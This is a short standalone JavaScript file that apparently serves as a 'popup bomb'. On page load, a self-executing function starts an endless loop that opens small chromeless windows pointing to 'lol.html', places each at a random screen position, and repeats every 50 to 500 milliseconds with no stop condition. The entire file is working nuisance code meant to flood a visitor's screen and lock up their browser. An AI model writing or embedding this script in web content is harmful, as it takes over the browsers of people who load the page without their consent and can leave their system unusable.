function openWindow(url) {
    var newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');

    // Move the new window to a random location once
    if (newWin) {
        var screenWidth = screen.width - 200; // Keep within bounds
        var screenHeight = screen.height - 180;

        var randomX = Math.floor(Math.random() * screenWidth);
        var randomY = Math.floor(Math.random() * screenHeight);

        newWin.moveTo(randomX, randomY);
    }

    return newWin;
}

function proCreate() {
    const openWithRandomDelay = () => {
        openWindow('lol.html');
        
        // Random delay between 50 ms and 500 ms
        const randomDelay = Math.floor(Math.random() * (500 - 50 + 1)) + 50;
        setTimeout(openWithRandomDelay, randomDelay);
    };
    
    // Initial random delay between 50 ms and 500 ms
    const initialRandomDelay = Math.floor(Math.random() * (500 - 50 + 1)) + 50;
    setTimeout(openWithRandomDelay, initialRandomDelay);
}

// Self-executing function to start immediately
(function () {
        proCreate();
})();
